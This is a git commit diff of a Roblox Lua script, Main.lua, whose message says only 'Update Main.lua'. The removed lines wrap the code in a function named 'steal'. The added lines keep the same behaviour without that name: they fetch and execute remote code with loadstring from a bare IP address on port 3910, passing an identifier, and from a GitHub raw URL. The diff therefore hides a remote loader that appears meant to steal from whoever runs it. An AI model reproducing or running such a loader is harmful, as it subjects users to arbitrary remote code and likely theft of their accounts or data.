8bc0e5a701489bd9e7a3f12cb078f64bb825ac30
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-15 19:44:42 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,11 +1,3 @@
-local function steal()
-    local ID = "b5bd87ab-c631-494c-9b65-aa0f5b823563"
-    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
-end
-
-local function visual()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Alr"))()
-end
-
-task.spawn(steal)
-task.spawn(visual)
+ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Alr"))()
